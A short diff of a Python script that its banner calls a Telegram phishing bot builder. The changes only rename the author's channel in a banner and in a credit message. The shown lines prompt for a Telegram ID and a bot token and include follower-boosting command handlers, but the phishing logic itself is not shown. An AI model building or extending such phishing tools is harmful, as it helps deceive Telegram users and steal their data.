@@ -67,7 +67,7 @@ ______ _   _ _____ _____ _   _
 print(Fore.GREEN + '#########################################')
 print(Fore.GREEN + '+' + Fore.BLUE +  "     Telegram phishing bot builder     " + Fore.GREEN + '+')
 print(Fore.GREEN + '+' + Fore.BLUE +  "       Developer: @lamer112311         " + Fore.GREEN + '+')
-print(Fore.GREEN + '+' + Fore.BLUE +  "        Channel: @Cyber_Puffin         " + Fore.GREEN + '+')
+print(Fore.GREEN + '+' + Fore.BLUE +  "        Channel: @CyberPuffin         " + Fore.GREEN + '+')
 print(Fore.GREEN + '#########################################')
 userid = input(Fore.YELLOW +  "Введите свой Telegram ID > ")
 token = input(Fore.BLUE +  "Введите токен бота > ")
@@ -111,7 +111,7 @@ ID: {{message.from_user.id}}''')
 
 @bot.message_handler(commands=['lamer112311dev'])
 def lamer112311(message):
-	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: @Cyber_Puffin') 
+	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: @CyberPuffin') 
 
 @bot.message_handler(commands=['nacrutka', 'n'])
 def start1(message):
@@ -239,7 +239,7 @@ def start(message):
 
 @bot.message_handler(commands=['lamer112311dev'])
 def lamer112311(message):
-	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: @Cyber_Puffin') 
+	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: @CyberPuffin') 
 
 @bot.message_handler(commands=['nacrutka', 'n'])
 def start1(message):
